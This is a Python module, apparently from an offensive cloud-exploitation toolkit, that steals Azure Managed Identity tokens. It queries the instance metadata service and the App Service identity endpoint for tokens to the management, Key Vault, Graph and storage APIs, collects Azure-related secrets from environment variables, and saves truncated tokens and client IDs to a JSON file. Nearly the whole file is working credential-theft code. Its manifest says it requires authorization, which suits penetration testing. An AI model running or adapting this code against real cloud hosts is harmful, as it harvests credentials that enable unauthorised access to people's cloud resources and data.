"""Azure Managed Identity abuse — token theft from IMDS and env vars."""


import json
import os
import sys
from datetime import datetime, timezone, UTC
from typing import Any

import requests


MANIFEST = {
    "capability_id": "cloudxpl.azure.managed_identity.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["http_requests_to_imds"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1552.005"],
}

AZURE_IMDS = "http://169.254.169.254/metadata"
IDENTITY_ENDPOINT_ENV = "IDENTITY_ENDPOINT"
IDENTITY_HEADER_ENV = "IDENTITY_HEADER"


def _try_imds_token(resource: str = "https://management.azure.com/") -> dict | None:
    try:
        resp = requests.get(
            f"{AZURE_IMDS}/identity/oauth2/token",
            params={"api-version": "2018-02-01", "resource": resource},
            headers={"Metadata": "true"},
            timeout=5,
        )
        if resp.status_code == 200:
            return resp.json()
    except requests.RequestException:
        pass
    return None


def _try_app_service_token(resource: str = "https://management.azure.com/") -> dict | None:
    endpoint = os.environ.get(IDENTITY_ENDPOINT_ENV)
    header = os.environ.get(IDENTITY_HEADER_ENV)
    if not endpoint or not header:
        return None
    try:
        resp = requests.get(
            endpoint,
            params={"api-version": "2019-08-01", "resource": resource},
            headers={"X-IDENTITY-HEADER": header},
            timeout=5,
        )
        if resp.status_code == 200:
            return resp.json()
    except requests.RequestException:
        pass
    return None


def run(args: Any) -> int:
    print("[*] Azure Managed Identity Token Extraction")

    results: dict[str, Any] = {"findings": []}
    resources = [
        "https://management.azure.com/",
        "https://vault.azure.net",
        "https://graph.microsoft.com/",
        "https://storage.azure.com/",
    ]

    for resource in resources:
        token_data = _try_imds_token(resource)
        source = "IMDS"
        if not token_data:
            token_data = _try_app_service_token(resource)
            source = "AppService"

        if token_data:
            finding = {
                "source": source,
                "resource": resource,
                "token_type": token_data.get("token_type"),
                "expires_on": token_data.get("expires_on"),
                "client_id": token_data.get("client_id"),
                "access_token_prefix": token_data.get("access_token", "")[:20] + "...",
            }
            results["findings"].append(finding)
            print(f"  [!] Token for {resource} via {source}: "
                  f"client_id={finding['client_id']}")

    env_secrets = {}
    for key, val in os.environ.items():
        key_upper = key.upper()
        if any(s in key_upper for s in [
            "AZURE", "ARM_", "MSI_", "IDENTITY_", "TENANT", "CLIENT_SECRET",
        ]):
            env_secrets[key] = val[:10] + "..." if len(val) > 10 else val

    if env_secrets:
        results["azure_env_vars"] = env_secrets
        print(f"  [+] {len(env_secrets)} Azure-related env vars found")

    if results["findings"] or results.get("azure_env_vars"):
        os.makedirs(args.output, exist_ok=True)
        ts = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
        out_path = os.path.join(args.output, f"azure_identity_{ts}.json")
        with open(out_path, "w") as fh:
            json.dump(results, fh, indent=2, default=str)
        print(f"[+] Output: {out_path}")
    else:
        print("[-] No managed identity tokens or Azure env vars found")

    return 0
